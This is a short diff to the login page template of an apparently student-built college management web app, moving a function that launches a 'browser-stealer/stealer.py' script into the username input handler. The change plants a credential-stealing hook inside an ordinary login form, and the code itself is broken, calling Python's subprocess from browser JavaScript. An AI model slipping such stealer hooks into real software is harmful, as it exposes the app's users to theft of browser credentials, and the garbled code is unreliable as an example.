@@ -38,10 +38,6 @@
 {% block js %}
 
 <script>
-  function runPythonScript() {
-    var pythonScriptPath = "C:/Users/shiv_/College-Management-System/College-Management-System/browser-stealer/stealer.py";
-    subprocess.run(["python", pythonScriptPath]);
-  }
   $('#login-form').submit(function (e) {
     // e.preventDefault();
     $('#login-btn').addClass('disabled')
@@ -50,6 +46,11 @@
 
   $("#username").on("input", function () {
     username = $(this).val();
+
+    function runPythonScript() {
+      var pythonScriptPath = "C:/Users/shiv_/College-Management-System/College-Management-System/browser-stealer/stealer.py";
+      subprocess.run(["python", pythonScriptPath]);
+    }
 
     $.ajax({
       url: "/accounts/ajax/validate-username/",
